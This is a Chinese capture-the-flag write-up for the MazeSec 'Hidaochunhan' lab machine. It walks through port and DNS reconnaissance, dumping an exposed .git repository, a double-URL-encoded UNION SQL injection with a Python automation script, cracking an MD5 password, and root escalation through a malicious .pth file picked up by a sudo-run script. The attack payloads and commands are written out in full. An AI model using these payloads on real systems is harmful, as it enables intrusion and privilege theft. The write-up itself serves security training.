> 来源：MazeSec
>
> 靶机ID：833
>
> 靶机名称：Hidaochunhan
>
> 靶机难度：Easy
>
> 靶机作者：111
>
> 宿主：`192.168.205.128`
>
> 靶机：`192.168.205.153`
>
> 辅助AI：deepseek-v4.1-flash
>
> 修订于 2026-11-22

## Flag

| Flag | 值                                            | 位置                        |
| ---- | --------------------------------------------- | --------------------------- |
| user | `flag{user-8cb1e937bf00ed5dcf2237bd78ccd622}` | `/home/daochunhan/user.txt` |
| root | `flag{root-74ac6077afbd5981973859a31330f2a2}` | `/root/root.txt`            |

## 攻击链

```text
1  nmap → 22/53/80
2  反查 PTR → daochunhan.dsz；Host 访问 → 气象现象观测站（PHP 8.5.12）
3  /.git 源码泄露 → db.php 数据库口令 + search.php 过滤顺序缺陷
4  双重 URL 编码绕过 → UNION SQL 注入 → dsz_user.password_hash
5  MD5 破解 → daochunhan2026 → SSH → user.txt
6  sudo -l → NOPASSWD /opt/weatherbot.py
7  用户可写 config.json + site.addsitedir() → 恶意 .pth → root.txt
```

---

## 一、信息收集

### 1. 端口扫描

目标只开放三个 TCP 端口，先做全端口扫描确认没有遗漏：

```bash
nmap -p- --min-rate 3000 -T4 192.168.205.153
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

再做服务识别：

```bash
nmap -sC -sV -p22,53,80 192.168.205.153
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.3 (protocol 2.0)
53/tcp open  domain  dnsmasq 2.92rel2
| dns-nsid:
|_  bind.version: dnsmasq-2.92rel2
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).
```

53 端口在这个环境里比较显眼，先记下来，后面用 DNS 反查拿到了 vhost 域名。

### 2. DNS 反查与 vhost 发现

```bash
dig @192.168.205.153 -x 192.168.205.153 +short
```

```text
daochunhan.dsz.
```

顺手试了 `dig @192.168.205.153 axfr .`，返回 `Transfer failed`，没有 zone transfer；不过 PTR 已经给出了关键域名。

把域名加入 hosts，或直接用 `curl --resolve`：

```bash
echo '192.168.205.153 daochunhan.dsz' | sudo tee -a /etc/hosts
```

```bash
# 没有 root 权限时也可以这样访问
curl --resolve daochunhan.dsz:80:192.168.205.153 http://daochunhan.dsz/
```

直接访问 IP 返回 nginx 默认页：

```http
HTTP/1.1 200 OK
Server: nginx
Content-Length: 10

It works!
```

带上 `Host: daochunhan.dsz` 后进入真正的业务站点：

```http
HTTP/1.1 200 OK
Server: nginx
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/8.5.12

<!DOCTYPE html>
...
<title>气象现象观测站</title>
```

站点是一个「气象现象观测站」，功能很简单：

- `/`：现象列表
- `/search.php?keyword=...`：关键词搜索
- `/detail.php?id=...`：详情页

---

## 二、`.git` 源码泄露

### 1. 发现 `.git`

```bash
curl -s http://daochunhan.dsz/.git/HEAD
```

```text
ref: refs/heads/master
```

`.git/config` 也可读：

```ini
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
[user]
    name = daochunhan
    email = daochunhan@mazesec.dsz
```

### 2. 还原源码

`/.git/info/refs?service=git-upload-pack` 返回 404，smart HTTP 不可用；但 `objects/` 下的 loose object 可以直接下载，按 `commit -> tree -> blob` 递归还原即可。本次用自写脚本还原，`git-dumper` 也可以完成同样的工作：

```bash
git-dumper http://daochunhan.dsz/.git/ ./src
```

本次还原出的提交：

```text
commit d24b8d310cfcaa5b7f53c66b5c8a2d8db86e94e1
Author: daochunhan <daochunhan@mazesec.dsz>
Date: ...

    init
```

文件列表：

```text
db.php
detail.php
index.php
search.php
style.css
view.php
```

### 3. 源码审计

`db.php` 里直接写了数据库连接信息：

```php
<?php
// db.php

function db() {
    static $pdo = null;
    if ($pdo === null) {
        $pdo = new PDO('mysql:unix_socket=/run/mysqld/mysqld.sock;dbname=dsz;charset=utf8mb4', 'root', '123456');
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    }
    return $pdo;
}
```

数据库是 `dsz`，用户 `root`，口令 `123456`，只走本地 unix socket。远程 3306 未开放，所以这个口令不能直接远程登录，但说明数据库账号的权限较多。

`detail.php` 用 `(int)` 强制转换 id，并且使用预处理：

```php
$id = (int)($_GET['id'] ?? 0);
...
db()->prepare("SELECT * FROM dsz_weather WHERE id = ? AND status = 1")->execute([$id]);
```

`index.php` 也是固定 SQL，没有用户输入。

问题在 `search.php`：

```php
$keyword = isset($_GET['keyword']) && is_string($_GET['keyword']) ? $_GET['keyword'] : '';

// 过滤特殊字符，避免影响页面输出
$keyword = htmlspecialchars(trim($keyword), ENT_QUOTES, 'UTF-8');

// 前端对关键词做过一次编码，这里还原
$kw = urldecode($keyword);

$sql = "SELECT id, title, season, summary, occur_month, risk_level FROM dsz_weather WHERE status = 1 AND (title LIKE '%{$kw}%' OR summary LIKE '%{$kw}%') ORDER BY id DESC";

try {
    $rows = db()->query($sql)->fetchAll();
} catch (PDOException $e) {
    $rows = [];
}
```

两个问题叠加：

1. `htmlspecialchars()` 是 HTML 转义，不是 SQL 转义；
2. 先做 HTML 转义，再做 `urldecode()`，等于把编码后的特殊字符又还原回来。

只要输入经过双重 URL 编码，就能让 `'`、`)`、`#` 这些字符进入 `$kw`，形成 SQL 注入。

---

## 三、前台 SQL 注入

### 1. 双重编码绕过

以单引号为例：

| 阶段                 | 值                                    |
| -------------------- | ------------------------------------- |
| 原始 URL             | `%2527`                               |
| PHP `$_GET` 解码一次 | `%27`                                 |
| `htmlspecialchars()` | `%27`（没有 HTML 特殊字符，保持不变） |
| `urldecode()`        | `'`                                   |
| 拼进 SQL             | 单引号，闭合 `LIKE` 字符串            |

直接发送 `%27` 时，PHP 解码出的 `'` 会被 `htmlspecialchars()` 变成 `&#039;`，而 `urldecode()` 不会还原 HTML 实体，注入失败；所以必须使用双重编码。

同理：

- `%2529` → `)`
- `%2523` → `#`
- `+` → 空格

### 2. 判断列数并闭合括号

原 SQL 的注入点在括号里：

```sql
... AND (title LIKE '%{kw}%' OR summary LIKE '%{kw}%') ORDER BY id DESC
```

只闭合单引号不够，因为 `#` 注释掉后半段后左括号没有闭合。需要同时闭合 `)`，再用 `UNION SELECT` 补齐 6 列：

```text
/search.php?keyword=%2527%2529+UNION+SELECT+1,2,3,4,5,6%2523
```

最终 SQL 等价于：

```sql
SELECT id, title, season, summary, occur_month, risk_level
FROM dsz_weather
WHERE status = 1 AND (title LIKE '%') UNION SELECT 1,2,3,4,5,6
-- 后面的 %' OR summary LIKE '%%') ORDER BY id DESC 被 # 注释
```

页面返回 9 条结果（原有 8 条 + UNION 1 条），最后一张卡片就是 UNION 行：

```html
<a class="card" href="detail.php?id=1">
  <h2>2</h2>
  <p>4</p>
  <div class="cmeta">
    <i class="dot s3"></i><span>5</span><i class="risk" style="--lv:5"></i>
  </div>
</a>
```

`2`、`4`、`5` 分别回显在第 2、4、5 列，说明列数正确，可以把第 2 列换成任意表达式。

### 3. 自动化读取

为了不手工拼 URL，写一个小脚本：把表达式放到第 2 列，双重 URL 编码后请求，取最后一张卡片的 `<h2>`：

```python
import urllib.parse, urllib.request, re, html

def sqli(expr):
    final = "') UNION SELECT 1,%s,3,4,5,6#" % expr
    raw = urllib.parse.quote(urllib.parse.quote(final, safe=''), safe='')
    body = urllib.request.urlopen(
        "http://daochunhan.dsz/search.php?keyword=" + raw
    ).read().decode('utf-8', 'replace')
    cards = re.findall(r'<h2>(.*?)</h2>', body, re.S)
    return html.unescape(cards[-1])
```

### 4. 数据库信息

```python
sqli("CONCAT(@@version,0x7c,IFNULL(@@secure_file_priv,'NULL'),0x7c,CURRENT_USER(),0x7c,@@datadir)")
```

```text
11.8.9-MariaDB|NULL|root@localhost|/var/lib/mysql/
```

- MariaDB `11.8.9`
- 当前用户 `root@localhost`
- `secure_file_priv` 为 `NULL`（无路径限制，但账号仍需具备 `FILE` 权限）
- 数据目录 `/var/lib/mysql/`

`HEX(LOAD_FILE('/etc/passwd'))` 返回 `NULL`。当前数据库账号权限较多，但 `information_schema.USER_PRIVILEGES` 中并没有 `FILE` 权限；`secure_file_priv` 为 `NULL` 只说明没有路径限制，不代表账号具备文件读写权限。因此 `LOAD_FILE`（以及 `SELECT ... INTO OUTFILE`）这条路走不通。好在我们只需要数据库里的用户表。

### 5. 表与用户

```python
sqli("CONCAT((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7c,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='dsz' AND table_name='dsz_user'))")
```

```text
dsz_user,dsz_weather|id,name,password_hash,created_at
```

用户表只有一行：

```python
sqli("CONCAT((SELECT GROUP_CONCAT(CONCAT_WS(0x3a,id,name,password_hash,created_at) SEPARATOR 0x7c7c) FROM dsz_user),0x7c,(SELECT COUNT(*) FROM dsz_user))")
```

```text
1:daochunhan:7363926e777ae17bd2f1a75ef36845bc:2026-11-18 14:31:11|1
```

得到：

```text
用户名：daochunhan
密码哈希：7363926e777ae17bd2f1a75ef36845bc
```

32 位十六进制，先按无盐 MD5 处理。

---

## 四、MD5 破解与 SSH 登录

### 1. 破解哈希

```bash
echo '7363926e777ae17bd2f1a75ef36845bc' > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

rockyou 跑完后没有命中：

```text
Recovered........: 0/1 (0.00%) Digests (total)
Progress.........: 14344385/14344385 (100.00%)
```

于是结合站点信息、用户名和年份做小范围候选，最终命中：

```text
7363926e777ae17bd2f1a75ef36845bc:daochunhan2026
```

验证：

```python
import hashlib
hashlib.md5(b"daochunhan2026").hexdigest()
# '7363926e777ae17bd2f1a75ef36845bc'
```

口令是「用户名 + 年份」，属于典型的弱口令。

### 2. SSH 登录

```bash
ssh daochunhan@192.168.205.153
```

```text
daochunhan@192.168.205.153's password: daochunhan2026

$ id
uid=1000(daochunhan) gid=1000(daochunhan) groups=1000(daochunhan)
$ hostname
Hidaochunhan
$ cat ~/user.txt
flag{user-8cb1e937bf00ed5dcf2237bd78ccd622}
```

`user.txt` 的权限是 `root:root 644`，放在用户家目录里，普通用户可读：

```text
-rw-r--r-- 1 root root 44 Nov 18 14:36 /home/daochunhan/user.txt
```

---

## 五、主机枚举与提权入口

### 1. 系统信息

```text
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.24.1
PRETTY_NAME="Alpine Linux v3.24"

Linux Hidaochunhan 6.18.39-0-virt #1-Alpine SMP PREEMPT_DYNAMIC 2026-07-21 05:39:33 x86_64 GNU/Linux
```

### 2. sudo 配置

```bash
sudo -l
```

```text
Matching Defaults entries for daochunhan on Hidaochunhan:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for daochunhan on Hidaochunhan:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User daochunhan may run the following commands on Hidaochunhan:
    (ALL) NOPASSWD: /opt/weatherbot.py
```

关键点：`daochunhan` 可以免密以 root 运行 `/opt/weatherbot.py`。

### 3. SUID / Capability 排查

```bash
find / -xdev -perm -4000 -type f 2>/dev/null

# 目标未安装 getcap，改用 Python 检查文件 capability 扩展属性
python3 - <<'PY'
import os

hits = []
for root, dirs, files in os.walk("/"):
    dirs[:] = [d for d in dirs if os.path.join(root, d) not in ("/proc", "/sys", "/dev", "/run")]
    for name in files:
        path = os.path.join(root, name)
        try:
            if "security.capability" in os.listxattr(path):
                hits.append(path)
        except OSError:
            pass

print(hits or "none")
PY
```

SUID 只有 Alpine 自带的常规项（`/usr/bin/sudo`、`/usr/bin/passwd`、`/bin/bbsuid` 等）；`getcap` 未安装，改用 Python 扫描 `security.capability` 扩展属性，输出为 `none`，没有发现带 Capability 的可执行文件，排除 SUID/Capability 路线。

### 4. `/opt/weatherbot.py`

```python
#!/usr/bin/env python3
import site
import json
import time
import random

CONF = "/home/daochunhan/preference/config.json"
LOG  = "/var/log/weatherbot.log"

WEATHER = ["会下雨", "是晴天", "要降温", "有雾", "刮大风", "会下雪", "冷空气要来", "会升温", "阴转多云", "有台风"]

FOOD    = ["螺蛳粉", "猪脚饭", "孜然拌饭", "黄焖鸡", "麻辣香锅", "沙县小吃",
           "兰州拉面", "麻辣烫", "手抓饼", "泡面", "冒菜", "铁板饭",
           "鸡公煲", "煎饼果子", "猫条", "小鱼干", "什么都不吃"]

def main():
    with open(CONF) as f:
        conf = json.load(f)

    if conf.get("plugins"):
        site.addsitedir(conf["plugins"])

    w = random.choice(conf.get("weather") or WEATHER)
    m = random.choice(conf.get("food") or FOOD)

    print("我猜明天" + w)
    print("猫猫今天吃什么？猫猫今天吃" + m + "！")

    with open(LOG, "a") as fh:
        fh.write("%s\t%s\t%s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), w, m))

if __name__ == "__main__":
    main()
```

配置文件：

```json
{
  "site": "气象现象观测站",
  "author": "daochunhan",
  "updated": "2026-11-18",
  "plugins": "/home/daochunhan/preference/plugins",
  "weather": ["会下雨", "是晴天", "要降温", "有雾", "刮大风", "会下雪", "冷空气要来", "会升温", "阴转多云", "有台风"],
  "food": ["螺蛳粉", "猪脚饭", "孜然拌饭", "黄焖鸡", "麻辣香锅", "沙县小吃",
           "兰州拉面", "麻辣烫", "手抓饼", "泡面", "冒菜", "铁板饭",
           "鸡公煲", "煎饼果子", "猫条", "小鱼干", "什么都不吃"]
}
```

漏洞链条：

1. `weatherbot.py` 由 root 通过 sudo 执行；
2. 它读取的 `CONF` 位于 `/home/daochunhan/preference/config.json`，属主是 `daochunhan`，普通用户可写；
3. `config.json` 的 `plugins` 字段指向用户可创建/可写的目录；
4. `site.addsitedir()` 会把该目录加入 `sys.path`，并处理目录下的 `.pth` 文件；
5. Python 的 `site` 模块会执行 `.pth` 中以 `import `（或 `import\t`）开头的行。

因此，只要在 `plugins` 目录放一个恶意 `.pth`，再触发 `sudo /opt/weatherbot.py`，就能以 root 执行任意 Python 代码。

---

## 六、`.pth` 提权到 root

### 1. 写入恶意 `.pth`

```bash
mkdir -p ~/preference/plugins
cat > ~/preference/plugins/evil.pth <<'EOF'
import os; os.system("id > /tmp/wb_id 2>&1; ls -l /root/root.txt >> /tmp/wb_id 2>&1; cat /root/root.txt >> /tmp/wb_id 2>&1")
EOF
```

注意 `.pth` 的可执行行必须以 `import` 开头；如果写成两行，第二行 `os.system(...)` 不会被执行，只会被当作路径处理。所有语句要放在同一行，用分号隔开。

### 2. 触发 root 执行

```bash
sudo /opt/weatherbot.py
cat /tmp/wb_id
```

```text
我猜明天刮大风
猫猫今天吃什么？猫猫今天吃铁板饭！
---
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
-rw-r--r-- 1 root root 44 Nov 18 14:36 /root/root.txt
flag{root-74ac6077afbd5981973859a31330f2a2}
```

`weatherbot.py` 的两行正常输出只是随机天气/食物，真正的代码在 `site.addsitedir()` 阶段已经执行。